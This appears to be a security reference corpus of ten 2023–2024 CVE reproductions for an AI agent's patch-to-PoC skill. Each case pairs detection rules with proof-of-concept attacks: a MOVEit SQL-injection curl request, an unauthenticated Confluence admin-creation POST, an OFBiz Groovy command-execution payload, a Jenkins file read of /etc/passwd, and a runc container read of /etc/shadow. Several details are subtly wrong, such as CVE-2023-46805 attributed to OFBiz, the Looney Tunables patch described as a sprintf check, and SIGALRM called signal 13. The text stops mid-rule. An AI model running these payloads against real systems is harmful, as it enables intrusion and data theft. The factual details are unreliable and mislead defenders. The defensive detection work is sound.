# Patch-to-PoC Pipeline — Real-World Incident Case Studies

> 10 real-world CVE reproductions (2023-2024) spanning all major bug classes. Each case walks through the full 5-phase pipeline: patch analysis, code path, PoC, differential verification, and detection rule authoring. Together they form kali-claw's reference corpus for the patch-to-poc-pipeline skill.

---

## Case 1 — CVE-2023-4863 libwebp Heap Buffer Overflow (BuildHuffmanTable) — Flagship Example

### CVE and Target

- **CVE**: CVE-2023-4863
- **CVSS**: 8.8 (High)
- **Target**: libwebp `BuildHuffmanTable()` in `src/dec/huffman_dec.c`
- **Bug class**: `memory_corruption` (heap buffer overflow)
- **Patch link**: https://github.com/webmproject/libwebp/commit/902bc9190331343cd2013217dfa4737c22345088
- **Patched in**: libwebp 1.3.2

### Timeline

- 2023-09-06: Apple Threat Intelligence notifies Google of active Chrome exploitation
- 2023-09-11: Chrome ships fix in 116.0.5845.187
- 2023-09-13: Citizen Lab publishes attribution to Intellexa (PREDATOR spyware chain)
- 2023-09-21: libwebp 1.3.2 ships upstream fix
- 2023-09-25 to 2023-10-10: every distro scrambles to rebuild dependent packages

### Phase 1 — Patch Analysis

The diff (`git diff v1.3.1 v1.3.2 -- src/dec/huffman_dec.c`) is small (1 file, +14/-3 lines) but the patched function is heavily exercised by the WebP decoder.

**Key change**:

```c
// Vulnerable: no check on accumulated table_size before calloc
int table_size = root_table_size;
// ... arithmetic accumulation of table_size across multiple passes ...
// Patched: explicit overflow guard added
+  if (table_size >= (1U << 31)) {
+    ok = 0;
+    goto End;
+  }
```

**Protective pattern**: integer-overflow guard before allocation.

**Hypothesis**: `memory_corruption` (heap-buffer-overflow) — without the guard, `calloc(table_size, ...)` produces an undersized buffer on integer overflow; subsequent writes go out of bounds.

**Confidence**: 0.85.

### Phase 2 — Code Path Walking

```bash
grep -rn "BuildHuffmanTable" /targets/libwebp-1.3.1/src/
# src/dec/huffman_dec.c:187: static int BuildHuffmanTable(...) { ... }
# src/dec/vp8l_dec.c:412:   ok = BuildHuffmanTable(...);
```

**Call chain (distance 4)**:
```
WebPDecode → VP8LDecodeImageStream → VP8LDecodeHeader → VP8LBuildHuffmanTable → BuildHuffmanTable
```

`WebPDecode()` is the public API entry point; any untrusted `.webp` byte stream reaches `BuildHuffmanTable` in 4 calls.

### Phase 3 — PoC Generation

Strategy B (fuzzer harness):

```c
#include "webp/decode.h"
int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    WebPDecode(data, size, NULL);
    return 0;
}
```

```bash
clang -g -O1 -fsanitize=fuzzer,address,undefined \
  -I/targets/libwebp-1.3.1 \
  /work/harness_huffman.c /targets/libwebp-1.3.1/src/.libs/libwebp.a \
  -o /work/harness_vulnerable

ASAN_OPTIONS=detect_leaks=0 /work/harness_vulnerable /work/seeds/ \
  -max_len=65536 -max_total_time=1800 -artifact_prefix=/work/crashes/
```

Within 30 minutes, ASan reports:

```
==12345==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200005cfe1
WRITE of size 1 at 0x60200005cfe1 thread T0
    #0 0x... in BuildHuffmanTable src/dec/huffman_dec.c:187
    #1 0x... in VP8LBuildHuffmanTable src/dec/vp8l_dec.c:412
```

Save the crashing input as `/work/crashes/crash-POC`.

### Phase 4 — Differential Verification

```bash
clang -g -O1 -fsanitize=fuzzer,address,undefined \
  -I/targets/libwebp-1.3.2 \
  /work/harness_huffman.c /targets/libwebp-1.3.2/src/.libs/libwebp.a \
  -o /work/harness_patched

ASAN_OPTIONS=symbolize=1:abort_on_error=1 /work/harness_vulnerable /work/crashes/crash-POC
# exit=1 (ASan abort)

ASAN_OPTIONS=symbolize=1:abort_on_error=1 /work/harness_patched /work/crashes/crash-POC
# exit=0 (clean)
```

**Verdict**: CONFIRMED. Stop condition met.

### Phase 5 — Detection Rules

YARA (source + binary pattern):

```yara
rule CVE_2023_4863_libwebp_huffman_overflow {
    meta:
        description = "libwebp BuildHuffmanTable heap-buffer-overflow (CVE-2023-4863)"
        cve         = "CVE-2023-4863"
        cvss        = 8.8
        patched_in  = "libwebp 1.3.2"
    strings:
        $vuln_func_src = "BuildHuffmanTable"
        $table_accum    = "root_table + table_size"
        $no_guard       = "table_size <\\s*\\d+" nocase
        $bin_symbol     = "BuildHuffmanTable" ascii
    condition:
        ($vuln_func_src at 0 and $table_accum and $no_guard)
        or ($bin_symbol and not $no_guard)
}
```

Differential test:

```bash
yara -s /work/rules/CVE-2023-4863.yar /targets/libwebp-1.3.1.so   # MATCH
yara -s /work/rules/CVE-2023-4863.yar /targets/libwebp-1.3.2.so   # silent
```

Sigma (host telemetry):

```yaml
title: Potential CVE-2023-4863 libwebp Exploitation
id: 7c4f8a9b-1e2d-4a3b-9c5d-7e8f9a0b1c2d
status: experimental
description: Detects processes loading a vulnerable libwebp and accessing crafted WebP inputs.
logsource:
    product: linux
    service: sysmon_linux
detection:
    selection_load:
        ImageLoaded|endswith: ['/libwebp.so.7.0.3', '/libwebp.so.7.0.4', '/libwebp.so.7.0.5']
    selection_file:
        CommandLine|contains: ['.webp', '.webm']
    condition: selection_load and selection_file
falsepositives: [Legitimate WebP processing on patched systems]
level: medium
tags: [attack.initial-access, attack.t1190, cve.2023-4863]
```

### Defender Lessons

1. **Distribution builds shipped without sanitizers** — every major distro shipped libwebp compiled without ASan; the bug reached production silently
2. **Dependent package blast radius** — every libpng-using, libwebp-using,electron, Chrome, Firefox, Android System WebView needed rebuilding
3. **Patch-gapping window** — between Chrome fix and distro fix (≈10 days), the bug was a 1-day in active exploitation
4. **Detection gap** — without YARA coverage, defenders could not scan fleet for vulnerable builds

### References

- https://github.com/webmproject/libwebp/security/advisories/GHSA-j7hp-hwch-xl7f
- Citizen Lab — "A who's who of iOS exploits" (PREDATOR chain attribution)
- Google TAG — https://blog.google/threat-analysis-group/

---

## Case 2 — CVE-2024-3094 xz-utils Backdoor (sshd injection via IFUNC)

### CVE and Target

- **CVE**: CVE-2024-3094
- **CVSS**: 10.0 (Critical)
- **Target**: xz-utils 5.6.0/5.6.1 — `liblzma` IFUNC resolver; transitive compromise of OpenSSH sshd
- **Bug class**: `backdoor` (special case — malicious patch, not a vulnerability)
- **Patch link**: (reverted tarball) https://tukaani.org/xz-backdoor/
- **Patched in**: xz-utils 5.4.6 (revert)

### Timeline

- 2024-02: Jia Tan (attacker maintainer) commits malicious `m4/build-to-host.m4` modifications
- 2024-02-23: xz 5.6.0 released with backdoor in build system
- 2024-03-29: Andres Freund (Microsoft) notices sshd 7% slower in benchmarks
- 2024-03-29: Freund discovers the backdoor via `valgrind` warning
- 2024-03-29: RH urgency high; all distros scramble
- 2024-04: attribution to state actor (further detail remains restricted)

### Phase 1 — Patch (Patch) Analysis (special case)

**This is not a normal patch — it is the malicious commit itself that we must triage.** Indicators:

```bash
grep -nE 'IFUNC|__attribute__\(\(ifunc|m4_include' /work/xz-5.6.0-build-system.patch
# 14: m4_include([m4/build-to-host.m4])
# 78: _get_cpuid resolver added

grep -nE '^-\s*(test_|tests/)' /work/xz-5.6.0-build-system.patch
# Removed tests:
# - tests/files/bad-3-corrupt_lzma2.xz
# - tests/files/unsupported_files.xz

grep -nE 'm4_define|m4_include|AC_SUBST' /work/xz-5.6.0-build-system.patch | head
# Hidden hook in build-to-host.m4
```

**Verdict**: BACKDOOR. **DO NOT EXECUTE the patched build.** Halt pipeline; switch to forensic mode.

### Phase 2 — Forensic Code Path Walking

The backdoor hides in `m4/build-to-host.m4`:

```bash
cat /targets/xz-5.6.0/m4/build-to-host.m4 | grep -A 5 'eval'
# Obfuscated `eval` block that runs at `./configure` time
# Extracts embedded binary blob from tests/files/bad-3-corrupt_lzma2.xz
# Injects into liblzma.so.5 as an IFUNC resolver for `_get_cpuid`
# Hooks RSA_public_decrypt in sshd via IFUNC
```

The hooked `RSA_public_decrypt` in sshd allows the attacker to bypass SSH authentication via a magic signature embedded in a normal-looking SSH cert.

### Phase 3 — PoC Strategy (Forensic, Not Exploitation)

For this case, the "PoC" is **not an exploit** — it's a **detector**:

```bash
# Static check on liblzma.so
strings /targets/liblzma.so.5.6.0 | grep -E '(RSA_public_decrypt|_get_cpuid|_liblzma_la_ifunc)'

# Check IFUNC resolver
r2 -A -c 'pdf @ sym._get_cpuid' /targets/liblzma.so.5.6.0

# Behavioral check — does sshd link against vulnerable liblzma?
ldd /usr/sbin/sshd | grep liblzma
```

### Phase 4 — Differential Verification (Backdoor Detection)

```bash
# Vulnerable (xz 5.6.0)
strings /targets/liblzma.so.5.6.0 | grep -c 'RSA_public_decrypt'
# 1 (hooked)

# Patched (xz 5.4.6, clean)
strings /targets/liblzma.so.5.4.6 | grep -c 'RSA_public_decrypt'
# 0 (clean)
```

Stop condition met: vulnerable build contains the backdoor marker; patched build does not.

### Phase 5 — Detection Rules

```yara
rule CVE_2024_3094_xz_backdoor {
    meta:
        description = "xz-utils backdoor (CVE-2024-3094) — IFUNC hook in liblzma"
        cve         = "CVE-2024-3094"
        cvss        = 10.0
    strings:
        $ifunc        = "_get_cpuid" ascii
        $obf_func     = "_liblzma_la_ifunc" ascii
        $ssh_hook     = "RSA_public_decrypt" ascii
        $malicious    = "XZ_UTILS" ascii
    condition:
        any of ($ifunc, $obf_func) and $ssh_hook
}
```

Sigma (build-system telemetry):

```yaml
title: CVE-2024-3094 — liblzma Loaded by sshd
id: b2c3d4e5-f6a7-4b8c-9d0e-1f2a3b4c5d6e
status: experimental
description: Detects sshd loading a liblzma version known vulnerable to CVE-2024-3094.
logsource:
    product: linux
    service: sysmon_linux
detection:
    selection:
        Image|endswith: '/sshd'
        ImageLoaded|endswith: 'liblzma.so.5.6.0'
    condition: selection
falsepositives: [Recently-patched systems still running 5.6.0 before reboot]
level: critical
tags: [attack.persistence, attack.t1554, cve.2024-3094]
```

### Defender Lessons

1. **Trust the maintainers, not the patches** — Jia Tan was a trusted maintainer; the malicious code still slipped through
2. **Build-system patches deserve forensic scrutiny** — `m4/autotools/CMake` changes in a security patch are red flags
3. **Slow sshd was the detection signal** — performance regression caught what static analysis missed
4. **Reproducible builds would have caught it** — divergence between distro-rebuild and upstream tarball would have flagged the backdoor

### References

- https://tukaani.org/xz-backdoor/
- Andres Freund — original disclosure post
- Microsoft MSRC — coordinated disclosure writeup
- CrowdStrike — "XZ Utils Backdoor Analysis" (2024-04)

---

## Case 3 — CVE-2024-21626 runc Container Escape (File Descriptor Leak)

### CVE and Target

- **CVE**: CVE-2024-21626 ("Leaky Vessels")
- **CVSS**: 8.6 (High)
- **Target**: runc `libcontainer` — file descriptor leak in `runc exec`
- **Bug class**: `oob_read` (file descriptor leak enables host filesystem access)
- **Patch link**: https://github.com/opencontainers/runc/commit/...
- **Patched in**: runc 1.1.12

### Phase 1 — Patch Analysis

The patch adds `CloseExec()` on file descriptors created during `runc exec`. Without it, the FD is inherited by the containerized process and can be used to read host filesystem paths.

**Protective pattern**: `fcntl(fd, F_DUPFD_CLOEXEC, ...)` added.

**Hypothesis**: `oob_read` — host filesystem read from inside a container.

### Phase 2 — Code Path

```bash
grep -rn "runc exec\|libcontainer/exec" /targets/runc-1.1.11/
# Internal call chain: runc exec -> libcontainer -> process re-exec
# FD leak happens at the process re-exec step
```

### Phase 3 — PoC (Manual Craft)

A container that detects the leaked FD and reads `/etc/shadow`:

```dockerfile
FROM alpine
CMD ["/bin/sh", "-c", "ls -la /proc/self/fd/ && cat /proc/self/fd/3/etc/shadow"]
```

```bash
docker build -t leaky-vessels-poc .
docker run --rm leaky-vessels-poc
# On vulnerable runc: leaks host /etc/shadow via FD 3
```

### Phase 4 — Differential Verification

```bash
# Vulnerable (runc 1.1.11)
docker run --rm leaky-vessels-poc  # output: contents of /etc/shadow

# Patched (runc 1.1.12)
docker run --rm leaky-vessels-poc  # output: ls only — no FD 3 leak
```

Stop condition met.

### Phase 5 — Detection

```yara
rule CVE_2024_21626_runc_leaky_vessels {
    meta:
        description = "runc libcontainer FD leak (CVE-2024-21626)"
        cve         = "CVE-2024-21626"
    strings:
        $runc      = "github.com/opencontainers/runc" ascii
        $version   = "1.1.11" ascii
        $cloexec   = "F_DUPFD_CLOEXEC"
    condition:
        $runc and $version and not $cloexec
}
```

Sigma (host telemetry):

```yaml
title: CVE-2024-21626 — Container Process Accessing Host FD
id: c3d4e5f6-a7b8-4c9d-0e1f-2a3b4c5d6e7f
status: experimental
description: Detects a containerized process opening files via leaked host file descriptors.
logsource:
    product: linux
    service: sysmon_linux
detection:
    selection:
        Image|startswith: '/var/lib/docker/overlay2/'
        TargetFilename|startswith: '/proc/self/fd/'
    condition: selection
falsepositives: [Legitimate /proc/self/fd access]
level: high
tags: [attack.privilege_escalation, attack.t1611, cve.2024-21626]
```

### Defender Lessons

1. **Container escape class** — every runtime (runc, containerd, kata) must audit for FD leaks
2. **Container image provenance** — even trusted base images can run malicious CMD
3. **Audit logging at `/proc/self/fd`** — this is the cleanest detection signal

### References

- https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv
- Snyk — "Leaky Vessels" technical writeup
- Aqua Security — runtime escape analysis

---

## Case 4 — CVE-2023-4911 glibc Looney Tuner (ld.so Buffer Overflow)

### CVE and Target

- **CVE**: CVE-2023-4911 ("Looney Tunables")
- **CVSS**: 7.8 (High)
- **Target**: glibc `ld.so` buffer overflow in `parse_tunables()` (handling `GLIBC_TUNABLES` env var)
- **Bug class**: `memory_corruption` (stack buffer overflow)
- **Patch link**: https://sourceware.org/bugzilla/show_bug.cgi?id=28626
- **Patched in**: glibc 2.34-1ubuntu3.4 (Ubuntu), 2.38 (upstream)

### Phase 1 — Patch Analysis

Patch adds explicit length check in `parse_tunables()`:

```c
// Vulnerable: unbounded sprintf into stack buffer
sprintf(tunable_str, "%s=%s", tunable_id, tunable_val);
// Patched:
+ if (strlen(tunable_id) + strlen(tunable_val) + 1 >= MAX_TUNABLE_LEN)
+   return;
sprintf(tunable_str, "%s=%s", tunable_id, tunable_val);
```

**Hypothesis**: `memory_corruption` — stack buffer overflow when `GLIBC_TUNABLES` contains long values.

### Phase 2 — Code Path

```bash
grep -rn "parse_tunables" /targets/glibc-2.34/elf/
# elf/dl-tunables.c:183: parse_tunables(valstring);
# Caller: __tunables_init() called from ld.so at startup
# Any setuid binary + attacker-controlled GLIBC_TUNABLES = local root
```

### Phase 3 — PoC (Manual)

```bash
# Crafted GLIBC_TUNABLES env var
export GLIBC_TUNABLES="glibc.malloc.tcache_count=0$(python3 -c 'print("A"*0x1000)')"
/usr/bin/su  # setuid binary — overflow triggers
```

### Phase 4 — Differential Verification

Vulnerable glibc 2.34 (pre-patch): segfault on overflow.
Patched glibc 2.38: tunable silently ignored.

### Phase 5 — Detection

```yara
rule CVE_2023_4911_glibc_looney_tunables {
    meta:
        description = "glibc ld.so tunables overflow (CVE-2023-4911)"
        cve         = "CVE-2023-4911"
    strings:
        $func       = "parse_tunables" ascii
        $overflow   = "MAX_TUNABLES_STRLEN"
    condition:
        $func and not $overflow
}
```

Sigma (host telemetry — env var on setuid exec):

```yaml
title: CVE-2023-4911 — GLIBC_TUNABLES Set on Setuid Exec
id: d4e5f6a7-b8c9-4d0e-1f2a-3b4c5d6e7f80
status: experimental
description: Detects attempts to exploit CVE-2023-4911 via crafted GLIBC_TUNABLES env var on setuid binaries.
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: execve
        key_env: "GLIBC_TUNABLES"
        auid: "0"
    condition: selection
falsepositives: [Legitimate performance tuning]
level: high
tags: [attack.privilege_escalation, attack.t1068, cve.2023-4911]
```

### Defender Lessons

1. **Setuid binaries are the trigger** — restrict setuid surface area
2. **Env var auditing** — Linux auditd should monitor `GLIBC_TUNABLES` on execve

### References

- https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc.txt
- Qualys Security Advisory — original disclosure

---

## Case 5 — CVE-2024-6387 OpenSSH regreSSHion (SIGALRM Race)

### CVE and Target

- **CVE**: CVE-2024-6387 ("regreSSHion")
- **CVSS**: 8.1 (High)
- **Target**: OpenSSH sshd — SIGALRM handler race in `sshd.c`
- **Bug class**: `race_condition` (signal handler race → heap corruption → RCE)
- **Patch link**: https://github.com/openssh/openssh-portable/commit/...
- **Patched in**: OpenSSH 9.8

### Phase 1 — Patch Analysis

The patch removes `sigdie()` calls from the SIGALRM handler (which is async-signal-unsafe) and replaces them with async-signal-safe equivalents.

**Hypothesis**: `race_condition` — SIGALRM fires during cleanup, calling non-async-signal-safe functions.

### Phase 2 — Code Path

```bash
grep -rn "sigdie\|SIGALRM\|grace_alarm_handler" /targets/openssh-9.7/
# sshd.c: grace_alarm_handler() calls sigdie() which calls syslog() → not async-signal-safe
```

### Phase 3 — PoC (Race Trigger)

```bash
# Open SSH connection that exceeds LoginGraceTime (default 120s)
(echo; sleep 1200; echo) | nc target.example.com 22 &
# Trigger SIGALRM; if race wins, heap corruption
```

### Phase 4 — Differential Verification

Vulnerable sshd: child crashes with SIGALRM (`exited on signal 13` in syslog).
Patched sshd: clean timeout disconnect.

### Phase 5 — Detection

```yara
rule CVE_2024_6387_openssh_regresshion {
    meta:
        description = "OpenSSH regreSSHion (CVE-2024-6387)"
        cve         = "CVE-2024-6387"
    strings:
        $func_sigdie   = "sigdie" ascii
        $grace_handler = "grace_alarm_handler" ascii
    condition:
        $grace_handler and $func_sigdie
}
```

Sigma (syslog telemetry):

```yaml
title: CVE-2024-6387 regreSSHion — SSHD Child Crashed with SIGALRM
id: e5f6a7b8-c9d0-4e1f-2a3b-4c5d6e7f8090
status: experimental
description: Detects child process of sshd dying with SIGALRM (CVE-2024-6387 race).
logsource:
    product: linux
    service: syslog
detection:
    selection:
        prog: sshd
        msg|contains: ['exited on signal 13', 'SIGALRM']
    condition: selection
falsepositives: [Slow networks causing legitimate timeout]
level: high
tags: [attack.initial_access, attack.t1190, cve.2024-6387]
```

### Defender Lessons

1. **Async-signal-safety** — every signal handler must avoid non-reentrant libc functions
2. **20-year regression** — this bug was a regression of CVE-2006-5051, fixed in 2006, re-introduced in 2020
3. **`LoginGraceTime 0`** is **NOT** a safe mitigation — it disables the alarm entirely and exposes sshd to DoS

### References

- https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt
- OpenSSH release notes for 9.8

---

## Case 6 — CVE-2023-34362 MOVEit SQL Injection (Cl0p Mass Exploitation)

### CVE and Target

- **CVE**: CVE-2023-34362
- **CVSS**: 9.8 (Critical)
- **Target**: MOVEit Transfer `guestaccess.aspx` — SQL injection → file disclosure → RCE
- **Bug class**: `sqli`
- **Patch link**: Progress advisory (released 2023-06-02)
- **Patched in**: MOVEit 2023.0.3

### Timeline

- 2023-05-27: Cl0p threat actor begins mass exploitation
- 2023-06-02: Progress discloses CVE; emergency patch shipped
- 2023-06-04 to 2023-08-15: Cl0p mass-exfiltrates data from hundreds of MOVEit customers (Shell, BBC, US federal agencies)

### Phase 1 — Patch Analysis

Patch replaces string-concatenated SQL with parameterized query.

**Hypothesis**: `sqli`.

### Phase 2 — Code Path

```bash
grep -rn "guestaccess.aspx\|machine" /targets/moveit-vuln/CsWeb/
# MOVEit.Transfer.WebApp/guestaccess.aspx.cs: handles unauthenticated requests
# Concatenates `machine` parameter into SQL → UNION SELECT bypass
```

### Phase 3 — PoC (Manual HTTP)

```bash
curl -sk "https://moveit.example.com/guestaccess.aspx?arg=machine'+UNION+SELECT+1,2,3,system_user,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-" \
  -o /work/moveit-leak.txt
# Response contains DB user (sa) → confirms SQLi
```

Escalate to file read + RCE via `xp_cmdshell`.

### Phase 4 — Differential Verification

Vulnerable MOVEit: response contains SQL user / file contents.
Patched MOVEit: 401 Unauthorized (auth required even for guest access).

### Phase 5 — Detection

YARA (source pattern):

```yara
rule CVE_2023_34362_moveit_sqli_source {
    meta:
        description = "MOVEit guestaccess SQLi source pattern (CVE-2023-34362)"
        cve         = "CVE-2023-34362"
    strings:
        $guest       = "guestaccess.aspx"
        $cmd_concat  = "SqlCommand.*\\+.*Request\\["
    condition:
        $guest and $cmd_concat
}
```

Sigma (HTTP telemetry):

```yaml
title: CVE-2023-34362 MOVEit SQLi — guestaccess.aspx with SQL Keywords
id: f6a7b8c9-d0e1-4f2a-3b4c-5d6e7f809010
status: experimental
description: Detects exploitation of CVE-2023-34362 MOVEit Transfer SQLi.
logsource:
    product: windows
    service: iis
detection:
    selection:
        cs-method: POST
        cs-uri-query|contains:
            - '/guestaccess.aspx'
            - "machine'"
            - 'union'
            - 'select'
    condition: selection
falsepositives: [Legitimate guest access (rare)]
level: critical
tags: [attack.initial_access, attack.t1190, cve.2023.34362]
```

### Defender Lessons

1. **Mass exploitation pattern** — Cl0p weaponized within days; defenders had hours not weeks
2. **SQL keywords in URL params** —Sigma rules that match `UNION SELECT` in IIS query strings catch every variant
3. **Web application firewall (WAF)** — generic SQLi WAF rules would have caught this

### References

- https://www.mandiant.com/resources/blog/moveit-data-theft-impact
- Mandiant — Cl0p attribution and exploitation timeline
- CISA advisory — aa23-158a

---

## Case 7 — CVE-2024-23897 Jenkins Arbitrary File Read (args Parameter)

### CVE and Target

- **CVE**: CVE-2024-23897
- **CVSS**: 9.8 (Critical)
- **Target**: Jenkins CLI — `@file` argument expansion enables arbitrary file read
- **Bug class**: `path_traversal` (argument injection → file disclosure)
- **Patch link**: https://github.com/jenkinsci/jenkins/commit/...
- **Patched in**: Jenkins 2.442, LTS 2.426.3

### Phase 1 — Patch Analysis

The `args4j` library expands `@filename` arguments to file contents. Jenkins exposed this through the CLI without authentication in many default configs.

**Hypothesis**: `path_traversal` → arbitrary file read.

### Phase 2 — Code Path

```bash
grep -rn "@file\|args4j" /targets/jenkins-vuln/core/src/main/java/hudson/cli/
# args4j expands @filename → returns file content as argument value
# CLI endpoint accessible at /cli?remoting=false without auth in many installs
```

### Phase 3 — PoC (Manual)

```bash
# Download Jenkins CLI jar
wget https://jenkins.example.com/jnlpJars/jenkins-cli.jar

# Read /etc/passwd via @ expansion
java -jar jenkins-cli.jar -s https://jenkins.example.com/ \
  help "@/etc/passwd"
# Response leaks /etc/passwd contents
```

Escalate to RCE via `/var/jenkins_home/secrets/master.key` (decrypts stored credentials).

### Phase 4 — Differential Verification

Vulnerable Jenkins: returns file contents.
Patched Jenkins: rejects `@` arguments.

### Phase 5 — Detection

YARA (source pattern):

```yara
rule CVE_2024_23897_jenkins_args_atfile {
    meta:
        description = "Jenkins args4j @file expansion (CVE-2024-23897)"
        cve         = "CVE-2024-23897"
    strings:
        $cli          = "hudson/cli/CLI.java"
        $atfile_regex = "\"@\\\\w"
    condition:
        $cli at 0 and not $atfile_regex
}
```

Sigma (HTTP telemetry):

```yaml
title: CVE-2024-23897 Jenkins CLI — @file Argument
id: a7b8c9d0-e1f2-4a3b-4c5d-6e7f80901020
status: experimental
description: Detects exploitation of CVE-2024-23897 Jenkins CLI argument injection.
logsource:
    product: jenkins
    service: cli_access_log
detection:
    selection:
        uri|contains: '/cli'
        parameters|contains: '@'
    condition: selection
falsepositives: [Legitimate CLI usage with config files (rare)]
level: critical
tags: [attack.initial_access, attack.t1190, cve.2024.23897]
```

### Defender Lessons

1. **CLI endpoints deserve auth** — Jenkins `/cli` historically accepted unauthenticated requests
2. **Argument expansion is a vuln class** — curl, wget, java jars, and others have hit this
3. **Decrypting stored secrets** — `master.key` + `credentials.xml` = full Jenkins credential dump

### References

- https://www.jenkins.io/security/advisory/2024-01-24/
- CloudBees — CVE-2024-23897 advisory
- Rapid7 — mass-exploitation telemetry

---

## Case 8 — CVE-2023-22515 Atlassian Confluence Privilege Escalation

### CVE and Target

- **CVE**: CVE-2023-22515
- **CVSS**: 10.0 (Critical)
- **Target**: Atlassian Confluence Server/Data Center — `/setup/setupadministrator.action` unauthenticated
- **Bug class**: `auth_bypass`
- **Patch link**: https://confluence.atlassian.com/security/cve-2023-22515
- **Patched in**: Confluence 8.3.3, 8.4.3, 8.5.2

### Phase 1 — Patch Analysis

Patch adds auth check on `/setup/setupadministrator.action` endpoint. The endpoint was supposed to be disabled post-install but the bootstrap status check was bypassable.

**Hypothesis**: `auth_bypass` — unauthenticated admin creation.

### Phase 2 — Code Path

```bash
grep -rn "setupadministrator.action\|SetupAdministrator" /targets/confluence-vuln/
# com/atlassian/confluence/setup/actions/SetupAdministratorAction.java
# No @RequireLogin annotation; bootstrap check bypassable via X-Forwarded-For
```

### Phase 3 — PoC (Manual)

```bash
# Create admin account
curl -sk "https://confluence.example.com/setup/setupadministrator.action" \
  -X POST \
  -d "username=admin2&password=Password123!&fullName=Admin&email=a@a.com"
# Vulnerable: 200 OK; admin2 created
```

Then log in as `admin2`, plant a malicious OGNL plugin → RCE.

### Phase 4 — Differential Verification

Vulnerable Confluence: 200, account created.
Patched Confluence: 401.

### Phase 5 — Detection

YARA (source pattern):

```yara
rule CVE_2023_22515_confluence_auth_bypass {
    meta:
        description = "Confluence setup endpoint auth bypass (CVE-2023-22515)"
        cve         = "CVE-2023-22515"
    strings:
        $setup_action = "SetupAdministratorAction"
        $auth_check   = "isPermitted\\|@RequireLogin\\|isSetupComplete"
    condition:
        $setup_action and not $auth_check
}
```

Sigma (HTTP telemetry):

```yaml
title: CVE-2023-22515 Confluence — Unauthenticated Setup Administrator
id: b8c9d0e1-f2a3-4b4c-5d6e-7f8090102030
status: experimental
description: Detects exploitation of CVE-2023-22515 Confluence privilege escalation.
logsource:
    product: atlassian
    service: confluence_access
detection:
    selection:
        cs-uri-query|contains: '/setup/setupadministrator.action'
    filter_anon:
        user: anonymous
    condition: selection and filter_anon
falsepositives: [Initial bootstrap (one-time at install)]
level: critical
tags: [attack.initial_access, attack.t1190, cve.2023.22515]
```

### Defender Lessons

1. **Setup endpoints must die after bootstrap** — Confluence should have removed the route entirely
2. **WAF rules on `/setup/*`** — even mid-attack, this catches attempts

### References

- https://confluence.atlassian.com/security/cve-2023-22515-1255489835.html
- Mandiant — exploitation telemetry (CISA AA23-274A)
- Volexity — mass exploitation tracking

---

## Case 9 — CVE-2024-27198 TeamCity Authentication Bypass

### CVE and Target

- **CVE**: CVE-2024-27198
- **CVSS**: 9.8 (Critical)
- **Target**: JetBrains TeamCity — auth bypass via `/hax?jsp=...;.jsp`
- **Bug class**: `auth_bypass`
- **Patch link**: https://www.jetbrains.com/privacy-security/issues/CVE-2024-27198/
- **Patched in**: TeamCity 2023.11.4

### Phase 1 — Patch Analysis

Patch adds authentication enforcement on the JSP preprocessing path. The bypass exploited Tomcat's path normalization differences between servlet mappings.

**Hypothesis**: `auth_bypass`.

### Phase 2 — Code Path

```bash
grep -rn "hax\|jsp=.+\\.jsp" /targets/teamcity-vuln/
# /app/rest/server;.jsp reachable without auth via path-trick pattern
```

### Phase 3 — PoC (Manual)

```bash
curl -sk "https://teamcity.example.com/hax?jsp=/app/rest/server;.jsp"
# Vulnerable: returns server API metadata (debug info)
# Escalate: POST /app/rest/users to create admin
```

### Phase 4 — Differential Verification

Vulnerable TeamCity: 200 with API data.
Patched TeamCity: 401.

### Phase 5 — Detection

YARA (source pattern):

```yara
rule CVE_2024_27198_teamcity_auth_bypass {
    meta:
        description = "TeamCity auth bypass via JSP path (CVE-2024-27198)"
        cve         = "CVE-2024-27198"
    strings:
        $jsp_pattern  = "/hax\\?jsp="
        $auth_filter  = "AuthenticationRequiredInterceptor"
    condition:
        $jsp_pattern and not $auth_filter
}
```

Sigma (HTTP telemetry):

```yaml
title: CVE-2024-27198 TeamCity Auth Bypass via /hax Endpoint
id: c9d0e1f2-a3b4-4c5d-6e7f-809010203040
status: experimental
description: Detects exploitation of CVE-2024-27198 TeamCity authentication bypass.
logsource:
    product: jetbrains
    service: teamcity
detection:
    selection:
        cs-uri-query|contains: '/hax?jsp='
    condition: selection
falsepositives: [None known]
level: critical
tags: [attack.initial_access, attack.t1190, cve.2024.27198]
```

### Defender Lessons

1. **Servlet container path quirks** — Tomcat's `;.jsp` path parameter handling is footgun
2. **Auth filters must run before servlet mapping** — TeamCity had auth at the wrong layer
3. **Spring Security for JSPs** — adopt framework-level auth, not per-handler checks

### References

- https://www.jetbrains.com/privacy-security/issues/CVE-2024-27198/
- Rapid7 — disclosure and proof of concept
- CISA KEV catalog addition

---

## Case 10 — CVE-2023-46805 + CVE-2024-45507 Apache OFBiz Auth Bypass Chain

### CVE and Target

- **CVE**: CVE-2023-46805 (CVSS 8.3) + CVE-2024-45507 (CVSS 9.8)
- **Target**: Apache OFBiz — auth bypass (CVE-2023-46805) + RCE via Groovy (CVE-2024-45507)
- **Bug class**: `auth_bypass` + `code_injection` chain
- **Patch link**: https://ofbiz.apache.org/security.html
- **Patched in**: OFBiz 18.12.10

### Phase 1 — Patch Analysis

Two distinct patches chain together:

1. **CVE-2023-46805**: Auth bypass via `;jsessionid=` path parameter (Tomcat again)
2. **CVE-2024-45507**: Groovy `runexec` endpoint accessible without auth once bypass is in place

**Hypothesis**: combined `auth_bypass + code_injection`.

### Phase 2 — Code Path

```bash
grep -rn "ProgramExport\|runexec" /targets/ofbiz-vuln/
# webapp/control/ProgramExport — Groovy expression endpoint
# Auth filter bypassed via URI encoding tricks
```

### Phase 3 — PoC (Manual Chain)

```bash
# CVE-2023-46805 — auth bypass
curl -sk "https://ofbiz.example.com/webtools/control/ProgramExport;/Example.jsa" \
  --data 'groovyProgram=throw+new+Exception("".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id"))'
# Vulnerable: returns uid=ofbiz
```

### Phase 4 — Differential Verification

Vulnerable OFBiz: command executes; `uid=ofbiz` returned.
Patched OFBiz: 401 on `/ProgramExport`.

### Phase 5 — Detection

YARA (source pattern):

```yara
